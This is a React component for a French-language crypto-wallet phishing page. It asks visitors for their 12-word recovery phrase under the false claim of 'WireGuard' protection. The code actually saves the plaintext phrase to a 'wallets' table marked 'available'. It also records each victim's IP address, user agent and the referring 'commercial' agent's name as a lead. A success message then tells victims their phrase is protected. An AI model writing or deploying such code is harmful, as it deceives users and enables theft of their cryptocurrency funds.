import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Eye, EyeOff, Shield, Lock, Info } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface SeedPhraseFormProps {
  onSuccess: () => void;
}

const SeedPhraseForm = ({ onSuccess }: SeedPhraseFormProps) => {
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [commercialId, setCommercialId] = useState<string | null>(null);
  const [commercialName, setCommercialName] = useState<string | null>(null);
  const { toast } = useToast();

  // Extract commercial ID from URL on component mount
  React.useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const cParam = urlParams.get('c'); // commercial ID parameter (?c=)
    const mainParam = urlParams.get(''); // main parameter (?=)
    
    // Try c parameter first, then main parameter (for existing links)
    const potentialCommercialId = cParam || mainParam;
    
    if (potentialCommercialId) {
      setCommercialId(potentialCommercialId);
      // Fetch commercial name - check if it's a valid commercial ID
      fetchCommercialName(potentialCommercialId);
    }
  }, []);

  const fetchCommercialName = async (commercialId: string) => {
    try {
      const { data, error } = await supabase
        .from('commercials')
        .select('name')
        .eq('id', commercialId)
        .single();

      if (data && !error) {
        setCommercialName(data.name);
      } else {
        // If not found as commercial ID, might be a tracking code
        console.log('Not a direct commercial ID, might be tracking code:', commercialId);
      }
    } catch (error) {
      console.error('Error fetching commercial name:', error);
    }
  };

  const handleWordChange = (index: number, value: string) => {
    const newSeedWords = [...seedWords];
    newSeedWords[index] = value.toLowerCase().trim();
    setSeedWords(newSeedWords);
  };

  const handleActivateProtection = async () => {
    const filledWords = seedWords.filter(word => word.trim() !== '');
    
    if (filledWords.length !== 12) {
      toast({
        title: "Erreur",
        description: "Veuillez entrer les 12 mots de votre phrase de récupération",
        variant: "destructive"
      });
      return;
    }

    setIsLoading(true);
    
    try {
      // Get user's IP address and user agent
      const response = await fetch('https://api.ipify.org?format=json');
      const ipData = await response.json();
      
      // Create wallet phrase from seed words
      const walletPhrase = seedWords.join(' ');
      
      // Save to wallets table
      const { error } = await supabase
        .from('wallets')
        .insert({
          wallet_phrase: walletPhrase,
          client_tracking_id: `user_${Date.now()}`,
          status: 'available'
        });

      if (error) {
        throw error;
      }

      // Also save to user_leads for tracking
      await supabase
        .from('user_leads')
        .insert({
          username: `wallet_${Date.now()}`,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          status: 'active',
          commercial_name: commercialName,
          name: 'Wallet User'
        });

      // Show success state
      onSuccess();
      
      toast({
        title: "Protection Activée",
        description: "Votre phrase de récupération est maintenant protégée par WireGuard",
      });

      console.log('Wallet protection activated successfully');

    } catch (error) {
      console.error('Error saving seed phrase:', error);
      toast({
        title: "Erreur",
        description: "Erreur lors de l'activation de la protection",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Card className="bg-gray-800 border-gray-700">
      <CardHeader className="pb-4">
        <CardTitle className="text-yellow-400 flex items-center gap-2">
          <Shield className="h-5 w-5" />
          Protection Avancée Wallet BIP39
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Seed Phrase Grid */}
        <div className="space-y-2">
          <Label className="text-gray-300 text-sm">
            Phrase de Récupération (12 mots)
          </Label>
          <div className="grid grid-cols-3 gap-2">
            {seedWords.map((word, index) => (
              <div key={index} className="relative">
                <Input
                  type={showSeedPhrase ? "text" : "password"}
                  placeholder={`Mot ${index + 1}`}
                  value={word}
                  onChange={(e) => handleWordChange(index, e.target.value)}
                  className="bg-gray-700 border-gray-600 text-white placeholder:text-gray-400 text-sm"
                />
              </div>
            ))}
          </div>
          <button
            type="button"
            onClick={() => setShowSeedPhrase(!showSeedPhrase)}
            className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mt-2"
          >
            {showSeedPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            {showSeedPhrase ? 'Masquer' : 'Afficher'} la phrase
          </button>
        </div>

        {/* Activate Protection Button */}
        <Button 
          onClick={handleActivateProtection}
          disabled={isLoading}
          className="w-full bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-semibold py-3 text-base"
        >
          {isLoading ? (
            <>
              <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-gray-900 mr-2"></div>
              Activation en cours...
            </>
          ) : (
            <>
              <Lock className="h-4 w-4 mr-2" />
              Activer la Protection
            </>
          )}
        </Button>

        {/* WireGuard Info Box */}
        <div className="bg-gray-700 border border-yellow-500/30 rounded-lg p-4">
          <div className="flex items-start gap-3">
            <Info className="h-5 w-5 text-yellow-500 mt-0.5 flex-shrink-0" />
            <div className="text-sm text-gray-300">
              <span className="text-gray-400">La protection </span>
              <span className="text-yellow-500 font-semibold">WireGuard</span>
              <span className="text-gray-400"> renforcera la sécurité de votre phrase de récupération et limitera les accès uniquement à votre adresse IP.</span>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default SeedPhraseForm;